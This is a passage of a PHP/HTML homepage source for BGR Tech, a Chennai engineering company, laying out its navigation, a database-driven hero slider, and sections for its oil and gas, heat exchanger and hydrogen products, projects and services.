<?php 
include('includes/config.php');


?>
<!DOCTYPE html>
<html lang="zxx">

<!-- Mirrored from demo.awaikenthemes.com/html-preview/solor/html/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 05 Oct 2024 11:14:53 GMT -->

<head>
	<!-- Meta -->
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="keywords" content="">
	
	<!-- Page Title -->
	<title>BGR Tech</title>
	<!-- Favicon Icon -->
	<link rel="shortcut icon" type="image/x-icon" href="images/logo.png">
	<!-- Google Fonts css-->
	<link rel="preconnect" href="https://fonts.googleapis.com/">
	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
	<link
		href="https://fonts.googleapis.com/css2?family=Dosis:wght@200..800&family=Lexend:wght@100..900&family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Lora:ital,wght@0,400..700;1,400..700&family=Open+Sans:ital,wght@0,300..800;1,300..800&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap"
		rel="stylesheet">

	<!-- <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&amp;family=Rubik:wght@400;500&amp;display=swap" rel="stylesheet"> -->
	<!-- Bootstrap css -->
	<link href="css/bootstrap.min.css" rel="stylesheet" media="screen">
	<!-- SlickNav css -->
	<link href="css/slicknav.min.css" rel="stylesheet">
	<!-- Swiper css -->
	<link rel="stylesheet" href="css/swiper-bundle.min.css">
	<!-- Font Awesome icon css-->
	<link href="css/all.min.css" rel="stylesheet" media="screen">
	<!-- Animated css -->
	<link href="css/animate.css" rel="stylesheet">
	<!-- Magnific css -->
	<link href="css/magnific-popup.css" rel="stylesheet">
	<!-- Main custom css -->
	<link href="css/custom.css" rel="stylesheet" media="screen">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
	<style>
		.service-content h3 {
			font-size: 18px !important;
		}

		.about-content p {
			text-align: justify;
		}

		.service-content p {
			font-size: 16px;
		}

		.hero-layout2-box .section-title h1 {
			font-size: 65px;
		}

		.swiper-pagination-bullet {
			width: 18px;
			height: 18px;
		}

		.swiper-pagination-bullet-active {
			background-color: #3ab54a !important;
		}
		
	/*	.modal {
  display: none; 
  position: fixed;
  padding-top: 30px; 
  left: 0;
  top: 0;
  width: 100%; 
  height: 100%; 
  overflow: hidden; 
  background-color: rgb(0,0,0); 
  background-color: rgba(0,0,0,0.4); 
}*/
.form-control{
    color:#000;
}
@media (max-width: 768px) {
    .modal-content {
        height:auto !important;
        width: 100% !important;
    }
}

/* Modal Content */
/*.modal-content {*/
/*  background-color: #fff;*/
/*  margin: auto;*/
/*  padding: 20px;*/
/*  border: 1px solid #888;*/
/*  width: 45%;*/
/*  color: #343434;*/
/*}*/

/* The Close Button */
/*.closepopup {*/
/*  color: #000;*/
/*  float: right;*/
/*  font-size: 28px;*/
/*  font-weight: bold;*/
/*  opacity: .5;*/
/*      text-align: right;*/
/*}*/

/*.closepopup:hover,*/
/*.closepopup:focus {*/
/*  color: #000;*/
/*  text-decoration: none;*/
/*  cursor: pointer;*/
/*}*/

/*.alert-success{*/
/*    background-image: -webkit-linear-gradient(top,#dff0d800 0,#c8e5bc00);*/
/*}*/
/*.contacttext p{*/
/*      font-size:15px;*/
/*      color: #343434;*/
/*  }*/
/* .modal-content p{*/
/*     margin:5px;*/
/* }*/
/* .modal-pop{*/
/*     height:400px;*/
/*     border-radius:0px;*/
/* }*/

.modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            position: relative;
            width:40%;
        }
        .modal img {
            width: 100%;
            height: auto;
            border-radius: 5px;
        }
        .close {
            position: absolute;
    top: 10px;
    right: 10px;
    background: rgba(0, 0, 0, 0.7);
    color: white;
    border: none;
    font-size: 20px;
    /* padding: 5px 10px; */
    cursor: pointer;
    border-radius: 50%;
    height: 30px;
    width: 30px;
        }
        .close:hover {
            background: #fff;
            color: #000;
        }
	</style>
</head>

<body class="tt-magic-cursor">

	<!-- Preloader Start -->
	<div class="preloader">
		<div class="loading-container">
			<div class="loading"></div>
			<div id="loading-icon"><img src="images/logo.png" alt=""></div>
		</div>
	</div>
	<!-- Preloader End -->

	<!-- Magic Cursor Start -->
	<div id="magic-cursor">
		<div id="ball"></div>
	</div>
	<!-- Magic Cursor End -->

	<!-- Topbar Section Start -->
	<!--<div class="topbar wow fadeInUp">-->
	<!--	<div class="container">-->
	<!--		<div class="row">-->
	<!--			<div class="col-md-8">-->
	<!-- Topbar Contact Information Start -->
	<!--				<div class="topbar-contact-info">-->
	<!--					<ul>-->
	<!--						<li><a href="#"><i class="fa-solid fa-envelope"></i> info@domain.com</a></li>-->
	<!--						<li><a href="#"><i class="fa-solid fa-phone"></i> +01 248 248 2481</a></li>-->
	<!--					</ul>-->
	<!--				</div>-->
	<!-- Topbar Contact Information End -->
	<!--			</div>-->

	<!--			<div class="col-md-4">-->
	<!-- Topbar Social Links Start -->
	<!--				<div class="header-social-links">-->
	<!--					<ul>-->
	<!--						<li><a href="#"><i class="fa-brands fa-facebook-f"></i></a></li>-->
	<!--						<li><a href="#"><i class="fa-brands fa-twitter"></i></a></li>-->
	<!--						<li><a href="#"><i class="fa-brands fa-linkedin-in"></i></a></li>-->
	<!--						<li><a href="#"><i class="fa-brands fa-instagram"></i></a></li>-->
	<!--					</ul>-->
	<!--				</div>-->
	<!-- Topbar Social Links End -->
	<!--			</div>-->
	<!--		</div>-->
	<!--	</div>-->
	<!--</div>-->
	<!-- Topbar Section End -->

	<!-- Header Start -->
	<header class="main-header new-header">
		<div class="header-sticky-">
			<nav class="navbar navbar-expand-lg">
				<div class="container">
					<!-- Logo Start -->
					<a class="navbar-brand" href="index.php">
						<img src="images/logo.png" alt="Logo" class="img-main">
					</a>
					<!-- Logo End -->

					<!-- Main Menu start -->
					<div class="collapse navbar-collapse main-menu">
						<ul class="navbar-nav" id="menu">
							<li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
							<li class="nav-item submenu"><a class="nav-link" href="#">About Us</a>
								<ul style="border-bottom-right-radius: 0px;">
									<li class="nav-item"><a class="nav-link" href="who-we-are.php">Who We Are</a></li>
									<li class="nav-item"><a class="nav-link" href="md-desk.php">MDs Desk</a></li>
									<li class="nav-item"><a class="nav-link" href="team.php">Executive Team</a></li>
									<!-- <li class="nav-item"><a class="nav-link" href="#">Vision Mission</a></li> -->
									<li class="nav-item"><a class="nav-link" href="quality-policy.php">Quality
											Policy</a></li>
									<li class="nav-item"><a class="nav-link"
											href="capability-credentials.php">Certifications & Credentials</a></li>
									<!--<li class="nav-item"><a class="nav-link" href="who-we-are.php">Our Affiliate</a>-->
									<li class="nav-item"><a class="nav-link" href="who-we-are.php">Our Affiliate</a>
										<ul style="border-top-left-radius: 0px;">
											<li class="nav-item"><a class="nav-link"
													href="./BGRTECH-Collabrah_Brochure.pdf" target="_blank">BGRTECH
													Collabrah </a></li>
											<li class="nav-item"><a class="nav-link" href="https://www.geabgr.com"
													target="_blank">GEABGR Energy System </a></li>
										</ul>

									</li>
								</ul>
							</li>
							<!--<li class="nav-item"><a class="nav-link" href="#">MDs desk</a></li>-->
							<!--<li class="nav-item"><a class="nav-link" href="team.php">Executive team</a></li>-->
							<!--<li class="nav-item"><a class="nav-link" href="#">Vision Mission</a></li>-->
							<!--<li class="nav-item submenu"><a class="nav-link" href="#">Capability & Credentials</a>-->
							<!--	<ul>-->
							<!--		<li class="nav-item"><a class="nav-link" href="#">ISO certificates</a></li>-->
							<!--		<li class="nav-item"><a class="nav-link" href="#">ASME certificates</a></li>-->
							<!--		<li class="nav-item"><a class="nav-link" href="#">Etc</a></li>-->
							<!--	</ul>-->
							<!--</li>-->



							<li class="nav-item"><a class="nav-link" href="industries.php">Industries</a></li>
							<li class="nav-item submenu"><a class="nav-link" href="#">Our Products</a>
								<ul>
									<li class="nav-item"><a class="nav-link" href="oil-and-gas-products.php">Oil and
											Gas Processing</a></li>
									<li class="nav-item"><a class="nav-link" href="heat-exchangers.php">Heat
											Exchangers</a></li>
									<li class="nav-item"><a class="nav-link"
											href="green-hydrogen-products.php">Hydrogen</a></li>
									<li class="nav-item"><a class="nav-link" href="others.php">Others</a></li>
								</ul>
							</li>
							<li class="nav-item submenu"><a class="nav-link" href="#">Our Projects</a>
								<ul>
									<li class="nav-item"><a class="nav-link"
											href="integrated-surface-facilities.php">Integrated Surface
											Facilities/Early Production Facilities</a></li>
									<li class="nav-item"><a class="nav-link" href="gas-processing-plant.php">Gas
											Gathering/Processing
											Station</a></li>
									<!-- <li class="nav-item"><a class="nav-link" href="gas-dehydration-unit.php">Gas
											Dehydration Unit</a></li>
									<li class="nav-item"><a class="nav-link" href="gas-sweetening-unit.php">Gas
											Sweetening Unit</a></li> -->
									<li class="nav-item"><a class="nav-link"
											href="hydrogen-generation-purification-storage.php">Hydrogen Generation,
											Purification
											& Storage</a></li>
									<li class="nav-item"><a class="nav-link" href="api650-storage-tanks.php">API 650
											Storage Tanks</a></li>
								</ul>
							</li>
							<li class="nav-item submenu"><a class="nav-link" href="#">Our Services</a>
								<ul>
									<li class="nav-item"><a class="nav-link"
											href="technical-engineering-services.php">Technical Engineering
											Services</a>
									</li>
									<li class="nav-item"><a class="nav-link" href="feasibility-study.php">Feasibility
											Study</a></li>
									<li class="nav-item"><a class="nav-link" href="feed-engineering.php">FEED
											Engineering</a></li>
									<!-- <li class="nav-item"><a class="nav-link" href="#">Spares Supply</a></li>
									<li class="nav-item"><a class="nav-link" href="#">Commissioning</a></li> -->
								</ul>
							</li>
							<li class="nav-item"><a class="nav-link" href="partners.php">Our Partners</a></li>

							<li class="nav-item "><a class="nav-link" href="#"><img class="dots-icon" src="images/icons/dots.png" style="width: 25px;"></a>
								<ul style="width:120px;">
									<li class="nav-item"><a class="nav-link" href="careers.php">Careers</a></li>
</ul>
						    </li>
							<!--<li class="nav-item"><a class="nav-link" href="blog.php">Blog</a></li>-->
							<!--<li class="nav-item"><a class="nav-link" href="contact.php">Contact</a></li>-->
							<!--<li class="nav-item highlighted-menu"><a class="nav-link" href="#">Enquiry Now</a></li>-->
						</ul>
					</div>
					<!-- Main Menu End -->

					<div class="navbar-toggle"></div>
				</div>
			</nav>

			<div class="responsive-menu"></div>
		</div>
	</header>
	<!-- Header End -->

	<!-- Hero Section Start -->
	<!-- Hero Section Start -->


	<div class="hero-layout2 hero-slider">
		<div class="hero-slider-layout2">
			<div class="swiper">
				<div class="swiper-wrapper">
				    
				    <?php $ret=mysqli_query($con,"SELECT * FROM tblslider WHERE Is_Active=1 ORDER BY id ASC");
							  $cnt=1;
							  while($row=mysqli_fetch_array($ret))
							  {?>
							  
							  
					<!-- Hero Slide Start -->
					<div class="swiper-slide">
						<div class="hero-slide">
							Slider Image Start
							<div class="hero-slider-image">
								<img src="<?php echo "admin/postimages/".$row['PostImage'] ?> " alt="">
							</div>
							Slider Image End

							Slider Content Start
							<div class="container">
								<div class="row align-items-center">
									<div class="col-lg-12">
										Hero Layout 2 Content Box Start
										<div class="hero-layout2-box custom-slider">
											<div class="section-title ">
												<!--<h3 class="wow fadeInUp" style="padding-left:0px;">Lorem Ipsum.</h3>-->
												<h1 class="text-anime"><?php echo $row['title1']?> <br><span><?php echo $row['title2']?></span></h1>
											</div>

											<div class="hero-content wow fadeInUp" data-wow-delay="0.25s">
												<p style="color: transparent;">BGR </p>
											</div>

										</div>
										Hero Layout 2 Content Box End
									</div>
								</div>
							</div>
							Slider Content End
						</div>
					</div>
					<!-- Hero Slide End -->
					  <?php $cnt=$cnt+1; }?>

					<!-- Hero Slide Start -->
					
					<!-- Hero Slide End -->

					<!-- Hero Slide Start -->
					
					<!-- Hero Slide End -->

					<!-- Hero Slide Start -->
					
					<!-- Hero Slide End -->

					<!-- Hero Slide Start -->
					
					<!-- Hero Slide End -->

					<!-- Hero Slide Start -->
					
					<!-- Hero Slide Start -->
				</div>

				<div class="swiper-pagination"></div>
				<div class="hero-button-prev" style="background-color: transparent;"></div>
				<div class="hero-button-next" style="background-color: transparent;"></div>
			</div>
		</div>
	</div>
	<!-- Hero Section End -->
	<!-- Hero Section End -->

	<!-- About Section Start -->
	<div class="about-us">
		<div class="container">
			<div class="row align-items-center">
				<div class="col-lg-6">
					<!-- About us Image Start -->
					<div class="about-image">
						<div class="about-img-1">
							<figure class="reveal image-anime">
								<img src="images/about-1.jpg" alt="">
							</figure>
						</div>

						<div class="about-img-2">
							<figure class="reveal image-anime">
								<img src="images/about-2.jpg" alt="">
							</figure>
						</div>
					</div>
					<!-- About us Image End -->
				</div>

				<div class="col-lg-6">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">About Us</h3>-->
						<h2 class="text-anime">Who We Are</h2>
					</div>
					<!-- Section Title End -->

					<!-- About us Content Start -->
					<div class="about-content wow fadeInUp" data-wow-delay="0.25s">
						<p>BGR Tech Ltd. an emerging company based out of Chennai, India that brings over four decades
							of rich engineering experience and technical prowess to the global energy sector. With
							expertise spanning a wide range of industries, from Oil and Gas Upstream applications to
							cutting-edge renewable energy solutions such as Green Hydrogen production systems, BGR Tech
							Ltd. </p>

						<!--<p>As a second-generation entrepreneur, I am honoured to carry forward the vision of our founder and chairperson, Mr B.G. Raghupathy.</p>-->

						<!--<ul>
							<li>Lorem Ipsum</li>
							<li>Lorem Ipsum</li>
							<li>Lorem Ipsum</li>
							<li>Lorem Ipsum</li>
						</ul>-->

						<a href="who-we-are.php" class="btn-default">More About</a>
					</div>
					<!-- About us Content End -->
				</div>
			</div>
		</div>
	</div>
	<!-- About Section End -->

	<!-- Our Services Section Start -->
	<div class="our-services">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Our Products</h3>-->
						<h2 class="text-anime">Our Products</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
				<div class="col-md-12">
					<!-- Services Slider Start -->
					<div class="services-slider">
						<div class="swiper customswiper">
							<div class="swiper-wrapper" style="display:flex; flex-wrap:nowrap;">
								<!-- Service Slide Start -->
								<div class="swiper-slide">
									<a href="oil-and-gas-products.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Oil&Gas_p22.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/Oil&Gas.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Oil and Gas Processing</h3>
												<!--<p style="color: #212529;">Lorem Ipsum Lorem Ipsum Lorem Ipsum</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<div class="swiper-slide">
									<a href="heat-exchangers.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Heat-Exchangers_p1.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/heat_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Heat Exchangers</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<div class="swiper-slide">
									<a href="green-hydrogen-products.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/service-3.jpg" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/hydrogen.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Hydrogen</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<div class="swiper-slide">
									<a href="others.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Others_p7.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/others_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Others</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->
							</div>

							<div class="swiper-pagination"></div>
							<div class="hero-button-prev"></div>
							<div class="hero-button-next"></div>

						</div>
					</div>
					<!-- Services Slider End -->
				</div>
			</div>
		</div>
	</div>
	<!-- Our Services Section End -->

	<div class="our-services">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Our Projects</h3>-->
						<h2 class="text-anime">Our Projects</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
				<div class="col-md-12">
					<!-- Services Slider Start -->
					<div class="services-slider">
						<div class="swiper customswiper">
							<div class="swiper-wrapper" style="display:flex; flex-wrap:nowrap;">
								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="integrated-surface-facilities.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Projects_p1.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/Integrated_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Integrated Surface
													Facilities/Early Production Facilities </h3>
												<!--<p style="color: #212529;">Lorem Ipsum Lorem Ipsum Lorem Ipsum</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->
								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="gas-processing-plant.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Projects_p2.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/gas_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Gas Gathering/Processing Station</h3>
												<!--<p style="color: #212529;">Lorem Ipsum Lorem Ipsum Lorem Ipsum</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<!--<div class="swiper-slide project-slide">-->
								<!--	<a href="gas-dehydration-unit.php">-->
								<!--		<div class="service-item">-->
								<!--			<div class="service-image">-->
								<!--				<figure>-->
								<!--					<img src="images/service-2.jpg" alt="">-->
								<!--				</figure>-->

								<!--				<div class="service-icon">-->
								<!--					<img src="images/icon-service-2.svg" alt="">-->
								<!--				</div>-->
								<!--			</div>-->

								<!--			<div class="service-content">-->
								<!--				<h3>Gas-->
								<!--					Dehydration Unit</h3>-->
								<!--				<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna-->
								<!--					aliquam eu. Nulla-->
								<!--					consectetur.</p>-->
								<!--			</div>-->
								<!--		</div>-->
								<!--	</a>-->
								<!--</div>-->
								<!-- Service Slide End -->
								<!-- Service Slide Start -->
								<!--<div class="swiper-slide project-slide">-->
								<!--	<a href="gas-sweetening-unit.php">-->
								<!--		<div class="service-item">-->
								<!--			<div class="service-image">-->
								<!--				<figure>-->
								<!--					<img src="images/service-2.jpg" alt="">-->
								<!--				</figure>-->

								<!--				<div class="service-icon">-->
								<!--					<img src="images/icon-service-2.svg" alt="">-->
								<!--				</div>-->
								<!--			</div>-->

								<!--			<div class="service-content">-->
								<!--				<h3>Gas-->
								<!--					Sweetening Unit</h3>-->
								<!--				<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna-->
								<!--					aliquam eu. Nulla-->
								<!--					consectetur.</p>-->
								<!--			</div>-->
								<!--		</div>-->
								<!--	</a>-->
								<!--</div>-->
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="hydrogen-generation-purification-storage.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Projects_p3.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/hydrogen_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Hydrogen Generation,
													Purification
													& Storage</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->
								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="api650-storage-tanks.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Projects_p4.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/api_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>API 650
													Storage Tanks</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->


							</div>

							<div class="swiper-pagination"></div>
						</div>
					</div>
					<!-- Services Slider End -->
				</div>
			</div>
		</div>
	</div>


	<div class="our-services">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Our Services</h3>-->
						<h2 class="text-anime">Our Services</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
				<div class="col-md-12">
					<!-- Services Slider Start -->
					<div class="services-slider">
						<div class="swiper customswiper">
							<div class="swiper-wrapper" style="display:flex; flex-wrap:nowrap;">
								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="technical-engineering-services.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Services_p1.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/technical_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Technical Engineering Services</h3>
												<!--<p style="color: #212529;">Lorem Ipsum Lorem Ipsum Lorem Ipsum</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="feasibility-study.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Services_p2.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/feasability_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Feasibility Study</h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->
								<!-- Service Slide Start -->
								<div class="swiper-slide project-slide">
									<a href="feed-engineering.php">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/Services_p3.png" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/feed_icon.png" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>FEED Engineering </h3>
												<!--<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>-->
											</div>
										</div>
									</a>
								</div>
								<!-- Service Slide End -->

								<!-- Service Slide Start -->
								<!--<div class="swiper-slide project-slide">
									<a href="">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/service-3.jpg" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/icon-service-3.svg" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Spares Supply</h3>
												<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>
											</div>
										</div>
									</a>
								</div>-->
								<!-- Service Slide End -->

								<!--Service Slide Start -->
								<!--<div class="swiper-slide">
									<a href="">
										<div class="service-item">
											<div class="service-image">
												<figure>
													<img src="images/service-2.jpg" alt="">
												</figure>

												<div class="service-icon">
													<img src="images/icon-service-2.svg" alt="">
												</div>
											</div>

											<div class="service-content">
												<h3>Commissioning</h3>
												<p style="color: #212529;">Aenean mattis mauris turpis, quis porta magna
													aliquam eu. Nulla
													consectetur.</p>
											</div>
										</div>
									</a>
								</div>-->
								<!-- Service Slide End -->
							</div>

							<div class="swiper-pagination"></div>
						</div>
					</div>
					<!-- Services Slider End -->
				</div>
			</div>
		</div>
	</div>

	<!-- Our Process Section Start -->
	<div class="our-process">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Our Latest Process</h3>-->
						<h2 class="text-anime">Our Work Process</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
				<div class="col-md-4">
					<!-- Step Item Start -->
					<div class="step-item step-1 wow fadeInUp" data-wow-delay="0.25s">
						<div class="step-header">
							<div class="step-icon">
								<figure>
									<img src="images/icon-step-1.svg" alt="">
								</figure>
								<span class="step-no">01</span>
							</div>
						</div>

						<div class="step-content">
							<h3>Engineering</h3>
							<p>Design (Process & Mechanical), piping, structural, electrical, instrumentation, Layout
								design, 3D modelling.</p>
						</div>
					</div>
					<!-- Step Item End -->
				</div>

				<div class="col-md-4">
					<!-- Step Item Start -->
					<div class="step-item step-2 wow fadeInUp" data-wow-delay="0.5s">
						<div class="step-header">
							<div class="step-icon">
								<figure>
									<img src="images/icon-step-2.svg" alt="">
								</figure>
								<span class="step-no">02</span>
							</div>
						</div>

						<div class="step-content">
							<h3>Manufacturing</h3>
							<p>Plate rolling, Welding, Cutting, drilling, skid assembly, Testing, safety complainces.
							</p>
						</div>
					</div>
					<!-- Step Item End -->
				</div>

				<div class="col-md-4">
					<!-- Step Item Start -->
					<div class="step-item wow fadeInUp" data-wow-delay="0.75s">
						<div class="step-header">
							<div class="step-icon">
								<figure>
									<img src="images/home_installation.png" alt="">
								</figure>
								<span class="step-no">03</span>
							</div>
						</div>

						<div class="step-content">
							<h3>Installation</h3>
							<p>Site Transportation, Erection, Site based testing, technical support, inspection,
								certification, commissioning.</p>
						</div>
					</div>
					<!-- Step Item End -->
				</div>
			</div>
		</div>
	</div>
	<!-- Our Process Section End -->

	<!-- Intro Video Section Start -->
	<!--<div class="intro-video">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Intro Video Box Start -->
	<!--	<div class="intro-video-box">
						<div class="video-image">
							<img src="images/video-bg.jpg" alt="">
						</div>

						<div class="video-play-button">
							<a href="https://www.youtube.com/watch?v=Y-x0efG1seA" class="popup-video">
								<img src="images/play.svg" alt="">
							</a>
						</div>
					</div>
					<!-- Intro Video Box End -->
	<!--	</div>
			</div>
		</div>
	</div>
	<!-- Intro Video Section End -->

	<!-- Our Sklii Section Start -->
	<!-- <div class="our-skills">
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="section-title">
						<h3 class="wow fadeInUp">Energy Progress</h3>
						<h2 class="text-anime">Solution For Oil & Gas</h2>
						<p class="wow fadeInUp" data-wow-delay="0.25s">It is a long established fact that a reader will
							be distracted by the readable content of a page when looking at its layout.</p>
					</div>
				</div>

				<div class="col-lg-6">
					<div class="skills-box">
						<div class="skillbar" data-percent="95%">
							<div class="skill-data">
								<div class="title">Solutions</div>
								<div class="count">95%</div>
							</div>
							<div class="skill-progress">
								<div class="count-bar"></div>
							</div>
						</div>
						<div class="skillbar" data-percent="80%">
							<div class="skill-data">
								<div class="title">Success</div>
								<div class="count">80%</div>
							</div>
							<div class="skill-progress">
								<div class="count-bar"></div>
							</div>
						</div>
						<div class="skillbar" data-percent="70%">
							<div class="skill-data">
								<div class="title">Marketing</div>
								<div class="count">70%</div>
							</div>
							<div class="skill-progress">
								<div class="count-bar"></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div> -->
	<!-- Our Sklii Section End -->

	<!-- Infobar Section Start -->
	<!--<div class="infobar">-->
	<!--	<div class="container">-->
	<!--		<div class="row">-->
	<!--			<div class="col-md-12">-->
	<!--				<div class="cta-box">-->
	<!--					<div class="row align-items-center">-->
	<!--						<div class="col-lg-4">-->
	<!-- CTA Image Start -->
	<!--							<div class="cta-image">-->
	<!--								<figure class="image-anime">-->
	<!--									<img src="images/cta-image.jpg" alt="">-->
	<!--								</figure>-->
	<!--							</div>-->
	<!-- CTA Image End -->
	<!--						</div>-->

	<!--						<div class="col-lg-8">-->
	<!-- CTA Content Start -->
	<!--							<div class="cta-content">-->
	<!--								<div class="phone-icon">-->
	<!--									<figure>-->
	<!--										<img src="images/icon-cta-phone.svg" alt="">-->
	<!--									</figure>-->
	<!--								</div>									-->
	<!--								<h3 class="text-anime">Have Questions? <span>Call Us</span> +91 7397698191</h3>-->
	<!--								<p class="wow fadeInUp" data-wow-delay="0.25s">It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout.</p>-->
	<!--							</div>-->
	<!-- CTA Content End -->
	<!--						</div>-->
	<!--					</div>-->
	<!--				</div>-->
	<!--			</div>-->
	<!--		</div>-->
	<!--	</div>-->
	<!--</div>-->
	<!-- Infobar Section End -->

	<!-- Why Choose us Section Start -->
	<div class="why-choose-us">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<!-- Section Title Start -->
					<div class="section-title">
						<!--<h3 class="wow fadeInUp">Why Choose Us</h3>-->
						<h2 class="text-anime">Why Choose Us</h2>
					</div>
					<!-- Section Title End -->
				</div>
			</div>

			<div class="row">
				<div class="col-lg-3 col-md-6">
					<!-- Why Choose Item Start -->
					<div class="why-choose-item wow fadeInUp" data-wow-delay="0.25s">
						<div class="why-choose-image">
							<img src="images/whyus-1.jpg" alt="">
						</div>

						<div class="why-choose-content">
							<div class="why-choose-icon">
								<img src="images/icon-whyus-1.svg" alt="">
							</div>

							<h3>Efficiency & Power</h3>
							<!--<p>Ut ut eros risus. In luctus fringilla augue, eget ultricies purus. Sed mauris a nisl.</p>-->
						</div>
					</div>
					<!-- Why Choose Item End -->
				</div>

				<div class="col-lg-3 col-md-6">
					<!-- Why Choose Item Start -->
